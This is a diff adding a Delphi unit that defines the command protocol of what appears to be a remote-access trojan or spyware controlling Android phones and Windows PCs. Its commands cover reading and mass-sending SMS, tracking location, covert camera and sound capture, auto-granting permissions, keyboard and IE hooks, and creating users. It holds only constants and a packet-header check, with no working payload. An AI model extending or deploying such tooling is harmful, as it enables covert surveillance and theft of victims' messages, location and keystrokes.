@@ -1,0 +1,146 @@
+unit uOrder;
+
+interface
+uses  windows;
+const
+
+  //数据传输协议包头：
+  UID:integer=8888;//包头标识;
+  VER:integer=1002;
+  ENC:integer=7619;
+
+  CMD_TEST=1000;//测试；
+
+  CMD_READY=1001;//准备好命令;
+
+  CMD_INFO=1002;//获取信息命令;
+  CMD_SMS_CONTENT = 3001;//获取短信内容命令；
+  CMD_SMS_SEND = 3002;//发送短信命令；
+  CMD_CONTACT_CONTENT = 3004;//通讯录；
+  CMD_SMS_SENDS = 3005;//群发短信；
+  CMD_SMS_CLEAR = 3006;//清空短信；
+  CMD_CALL=1004;//获取命令;
+  CMD_LOCK=1005;//锁屏命令;
+  CMD_SHOT=1006;//截屏命令;
+  CMD_SHOTCODE=1007;//截屏命令;
+  CMD_RETURN=1008;//返回
+  CMD_POS=1009;//点击命令
+  CMD_LIGHT=1010;//亮屏命令;
+  CMD_GIVE_POWER=1011;//自动授权命令;
+  CMD_CAMERA=1012;//相机命令；
+  CMD_SLIDE=1013;//滑动命令；
+  CMD_CMD=1014;//执行CMD命令；
+  CMD_GET_CMD_OUT=1015;//获取执行CMD命令结果；
+  CMD_REBOOT=1016;//重启手机；
+  CMD_SHUTDOWN=1017;//关机；
+  CMD_RESTART=1018;//重启应用；
+  CMD_UNLOCK=1019;//解除我的锁屏；
+  CMD_RECORD_SCREEN_START=1020;//录屏开始；
+  CMD_RECORD_SCREEN_END=1021;//录屏结束；
+  CMD_RECORD_VIDEO_START=1022;//录像开始；
+  CMD_RECORD_VIDEO_END=1023;//录像结束；
+  CMD_HOME=1024;//返回桌面
+  CMD_GET_INSTALL_APP_INFO=1025;//获取已安装的应用信息；
+  CMD_INSTALL_APP=1026;//安装；
+  CMD_UNINSTALL_APP=1027;//卸载；
+  CMD_RUN_APP=1028;//运行；
+  CMD_KILL_APP=1029;//终止运行；
+  CMD_LONG_CLICK=1030;//长按命令；
+  CMD_INPUT=1031;//输入 命令；
+  CMD_CAMERA_CAP_START=1032;//录像开始；
+  CMD_CAMERA_CAP_END=1033;//录像结束；
+  CMD_INSERT_IMG_TO_GALLERY=1034;//照片插入到相册；
+  CMD_SOUND_CAP_START=1035;//拾音开始；
+  CMD_SOUND_CAP_END=1036;//拾结束；
+
+  CMD_CONTROL=1900;//转发专用命令： 控制端上线；
+  CMD_LIST_CLIENT=1901;//转发专用命令：列举被控端；
+  CMD_ADD_CLIENT=1902;//转发专用命令：被控端上线；
+  CMD_DEL_CLIENT=1903;//转发专用命令：被控端下线；
+  CMD_REQUEST_USER_ID=1904;//申请用户ID
+
+  CMD_LOCATION_SINGLE = 2001;//获取定位信息：
+	CMD_LOCATION_SERIES = 2002;//连续获取定位信息：
+  CMD_LOCATION_STOP = 2003;//停止获取定位信息：
+
+  CMD_FILE_LIST=4001;//列举目录；传递绝对路径；
+  CMD_FILE_TRANS=4002;//文件传输
+  CMD_FILE_DEL=4003;//删除文件
+
+  FILE_DIR_ROOT=4100;//根目录；
+  FILE_DIR_EX_SD = 4101;//外置SD卡目录标志;
+	FILE_DIR_SD = 4102;//内置SD卡目录标志;
+	FILE_DIR_PHOTO = 4103;//相册目录;
+
+  
+  //-----------------------特殊目录定义---------------------------------
+  //DIR_EXT_SD:string='';
+  //**********************一级命令*******************************
+  o_READY=00;
+  o_Screen=2010;
+  o_KeyMouse=2020;
+  o_PCInfo=2030;
+  o_TransFiles=2040;
+  o_ListDrvs=2050;
+  o_ListFileInfos=2060;
+  o_ListProcs=2070;
+  o_opProc=2080;
+  o_Reg=2090;
+  o_ReNamePC=2100;
+  o_GetPCName=2110;
+  o_opHookKey=2120;
+  o_HookIE=2150;
+  o_UnHookIE=2160;
+  o_Close=2170;
+  o_Update=2180;
+  o_RunFile=2190;
+  o_DelFile=2200;
+  o_Delete=2210;
+  o_CrtDir=2220;
+  o_DelDir=2230;
+  o_CAD=2240;
+  o_Svc=2250;
+  o_Reboot=2260;
+  o_CrtUser=2270;
+  o_TermSvr=2280;
+  o_GetCID=2290;    //06-05-13
+  o_Add=2300;       //06-05-13
+  o_CMD=2310;       //06-08-13
+  o_video=2320;       //06-11-11
+type
+  POrderHeader=^stOrderHeader;
+  stOrderHeader=packed record
+    uid:DWORD;
+    Ver:DWORD;
+    Enc:DWORD;
+    id:DWORD;
+    pid:DWORD;
+    cmd:DWORD;
+    len:DWORD;
+    dat:pointer;
+  end;
+  function VerifyOH(oh:stOrderHeader) :boolean;//校验包头;
+  function formatOH(var oh:stOrderHeader) :stOrderHeader;//格式化包头;
+var
+  id:DWORD;
+implementation
+function VerifyOH(oh:stOrderHeader) :boolean;//校验包头;
+begin
+  result:=true;
+  if(oh.uid<>UID)then result:=false;
+  if(oh.Ver<>VER)then result:=false;
+  if(oh.ENC<>ENC)then result:=false;
+end;
+function formatOH(var oh:stOrderHeader) :stOrderHeader;//格式化包头;
+begin
+  oh.uid:=UID;
+  oh.Ver:=VER;
+  oh.Enc:=ENC;
+  oh.id:=id;
+  oh.pid:=0;
+  oh.cmd:=CMD_READY;
+  oh.len:=0;
+  oh.dat:=nil;
+  result:=oh;
+end;
+end.
